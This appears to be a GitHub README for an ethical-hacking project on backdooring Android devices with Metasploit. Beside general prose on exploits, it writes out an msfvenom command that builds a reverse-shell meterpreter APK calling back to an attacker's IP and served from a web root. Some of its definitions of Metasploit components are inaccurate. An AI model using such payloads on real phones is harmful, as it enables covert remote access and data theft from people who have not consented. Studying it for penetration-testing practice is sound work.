# Hacking-Android-devices-using-Metasploit-Framework
Android hacking made easy with Metasploit framework - my project on exploiting vulnerabilities for penetration testing and ethical hacking.

## Introduction

A backdoor is any route by which someone can circumvent normal security measures to access a system. Pieces of software often come with backdoors built into their code so that engineers and developers can bypass their own defenses to fix problems for their users. Backdoor attacks involve cybercriminals using these entry points to gain unauthorized access to data and systems. These incidents often go undetected, at least at first, because the hackers didn’t have to disrupt or brute force their way through any of the cybersecurity systems. Once they’ve got remote access to a network or device, a bad actor can install malware, engage in data theft, and spy on user activity.

Backdoor attacks can be extremely dangerous because they often involve hackers gaining an extremely high level of access and privileges within a system or network. If they can do this without being detected, they can then squat there for months, monitoring user activity.
An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network. In some cases, an exploit can be used as part of a multi-component attack. Instead of using a malicious file, the exploit may instead drop another malware, which can include backdoor Trojans and spyware that can steal user information from the infected systems.

## Features of Metasploit Framework:

The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it’s an open-source framework, it can be easily customized and used with most operating systems.

Due to its wide range of applications and open-source availability, Metasploit is used by everyone from the evolving field of DevSecOps pros to hackers. It’s helpful to anyone who needs an easy to install, reliable tool that gets the job done regardless of which platform or language is used. The software is popular with hackers and widely available, which reinforces the need for security professionals to become familiar with the framework even if they don’t use it.

1.	Exploit: Tool used to take advantage of system weaknesses.
2.	Payloads: Sets of Malicious code.
3.	Auxiliary functions: Supplementary tools and commands
4.	Encoders: Used to convert code to information
5.	Listeners: Malicious software that hides in order to gain access
6.	Shellcode: Code that is programmed to activate once inside the target.
7.	Post-exploitation code: Helps test deeper penetration once inside
8.	Nops: An instruction to keep the payload from crashing. 

IMPLEMENTATION:


1.	Generating a Payload with msfvenom
Start Kali Linux so that we may generate an apk file as a malicious payload. We need to check our local IP that turns out to be ‘192.168.0.112’. You can also hack an Android device through Internet by using your Public/External IP in the LHOST and by port forwarding.
 

After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:
# msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk
Where:
-p indicates a payload type
android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
LHOST is your local IP
LPORT is set to be as a listening port
R> /var/www/html would give the output directly on apache server
apk is the final name of the final output

